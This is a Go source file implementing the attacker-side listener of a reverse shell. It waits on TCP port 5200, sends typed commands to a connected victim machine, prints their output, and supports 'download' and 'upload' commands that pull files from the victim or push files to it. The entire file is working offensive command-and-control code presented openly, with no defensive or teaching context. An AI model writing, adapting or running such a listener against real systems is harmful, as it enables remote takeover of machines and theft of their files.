package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func main() {

	listener, err := net.Listen("tcp", ":5200")

	if err != nil {
		fmt.Println("Nope")
	} else {
		fmt.Println("Listening for connection")
		conn, _ := listener.Accept()

		target_communication(conn, listener)
	}
}

func target_communication(conn net.Conn, listener net.Listener) {

	for {
		command := ""

		reader := bufio.NewReader(os.Stdin)

		fmt.Print("Reverse Shell on Port 5200: ")
		command, _ = reader.ReadString('\n')

		command = strings.Replace(command, "\n", "", -1)

		send_data(command, conn)

		if command == "quit" {
			break
		} else if len(command) >= 8 && command[:8] == "download" {
			download_file(command[9:], conn)
			fmt.Println("Download complete re-establish connection")
			conn.Close()

			fmt.Println("Re-establish connection after Download")
			conn, _ = listener.Accept()

		} else if len(command) >= 6 && command[:6] == "upload" {
			upload_file(command[7:], conn)
			fmt.Println("Download complete re-establish connection")
			conn.Close()

			fmt.Println("Re-establish connection after Download")
			conn, _ = listener.Accept()

		}

		receive_data(conn)

	}

}

func send_data(command string, conn net.Conn) {
	jsondata, _ := json.Marshal(command)
	conn.Write([]byte(jsondata))
}

func receive_data(conn net.Conn) {

	var buffer []byte = make([]byte, 1024)
	cargo, _ := conn.Read(buffer)

	for i := 0; i < cargo; i++ {
		if string(buffer[i]) == "\\" && string(buffer[i+1]) == "r" {
			fmt.Println()
			buffer[i+1] = 0
			fmt.Print()
		} else {
			fmt.Print(string(buffer[i]))
		}
	}
	fmt.Println()
}

func download_file(download string, conn net.Conn) {
	var buffer []byte = make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	file, err := os.Create(download)

	if err != nil {
		panic(err)
	}

	for {

		cargo, err1 := conn.Read(buffer)

		file.Write([]byte(buffer[:cargo]))

		if err1 != nil {
			{
				fmt.Println("EOF")
				break
			}
		}

	}

	file.Close()

}

func upload_file(command string, conn net.Conn) {
	var buffer []byte = make([]byte, 1024)
	file, _ := os.Open(command)

	for {
		cargo, err := file.Read(buffer)

		conn.Write([]byte(buffer[:cargo]))
		if err != nil {
			fmt.Println("EOF")
			break
		}
	}
	file.Close()
}
